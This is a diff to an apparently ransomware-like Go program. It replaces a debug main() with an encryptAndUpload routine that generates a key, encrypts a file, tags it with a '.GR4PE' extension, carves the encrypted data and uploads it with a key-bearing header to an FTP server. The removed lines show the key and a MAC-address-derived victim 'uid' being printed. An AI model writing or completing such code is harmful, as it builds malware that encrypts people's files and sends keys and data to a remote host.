@@ -352,80 +352,24 @@ func ftpUpload(filename string, data []byte) (int, error) {
 	return 1, nil
 }
 
-func main() {
-	//inputFileName := "tmpfile/in/test"
-	//buf, err := removeByte(inputFileName, 40, 10)
-	//check(err)
-	//fmt.Println(buf)
-	fmt.Print(getMacAddr())
+func encryptAndUpload(filename string) {
 	key := genEncryptionKey()
-	// fmt.Print(genUploadHeader(
-	// 	[]byte("test"),
-	// 	[]Data{
-	// 		{
-	// 			idx:  []byte("IDX.0x000000000100"),
-	// 			data: []byte("test1"),
-	// 		},
-	// 		{
-	// 			idx:  []byte("IDX.0x000000000001"),
-	// 			data: []byte("test2"),
-	// 		},
-	// 		{
-	// 			idx:  []byte("IDX.0x000000000002"),
-	// 			data: []byte("test3"),
-	// 		},
-	// 	}, key))
-	//fmt.Print(ftpUpload("test", []byte("test")))
-	fmt.Print("\n================\n")
-	//to hex
-	fmt.Printf("%x", key)
-	data, _ := encrypt([]byte("test"), key)
-	fmt.Print("\n================\n")
-	fmt.Printf("%x", data)
-	fmt.Print("\n================\n")
-	data, _ = decrypt(data, key)
-	fmt.Printf("%s", data)
-	fmt.Print("\n================\n")
-	//encryptFile("tmpfile/in/test", key)
-	//decryptFile("tmpfile/in/test.enc", key)
 	putHeader(
 		Header{
 			[]byte(".GR4PE"),
-			[]byte("tmpfile/in/test copy"),
+			[]byte(filename),
 		},
 	)
-	encryptFile("tmpfile/in/test", key)
-	carveData("tmpfile/in/test.GR4PE")
-	fmt.Print("\n================\n")
-	//removeByte("tmpfile/in/test", 100, 100, 0)
-	fmt.Print("\n================\n")
-	//====== mainTest ======
-	fmt.Print("\n================\n")
-	fmt.Println("uid: " + strings.Replace(getMacAddr(), ":", "", -1))
-	fmt.Println("key: " + fmt.Sprintf("%x", key))
-	putHeader(
-		Header{
-			[]byte(".GR4PE"),
-			[]byte("tmpfile/in/test"),
-		},
-	)
-	encryptFile("tmpfile/in/test copy", key)
-	fmt.Println("encryptFile: tmpfile/in/test.GR4PE")
-	carveDatas := carveData("tmpfile/in/test copy.GR4PE")
-
-	for i := 0; i < len(carveDatas); i++ {
-		fmt.Println("carveData: " + idxToString(int64(i), carveDatas[i].idx))
-	}
+	encryptFile(filename, key)
+	carveData(filename + ".GR4PE")
 	uploadHeader := genUploadHeader(
-		[]byte("tmpfile/in/test copy"),
-		carveDatas,
+		[]byte(filename),
+		carveData(filename+".GR4PE"),
 		key,
 	)
-	fmt.Println("uploadHeader: " + string(uploadHeader.filename))
-	fmt.Println("uploadHeader: " + string(uploadHeader.mac))
-	for i := 0; i < len(uploadHeader.Data); i++ {
-		fmt.Println("uploadHeader: " + string(uploadHeader.Data[i].idx))
-	}
-	ftpUpload(filenameHash("tmpfile/in/testcopy.GR4PE"), []byte(stripStruct(fmt.Sprintf("%s", uploadHeader))))
+	ftpUpload(filenameHash(filename), []byte(stripStruct(fmt.Sprintf("%s", uploadHeader))))
+}
 
+func main() {
+	encryptAndUpload("tmpfile/in/test copy")
 }
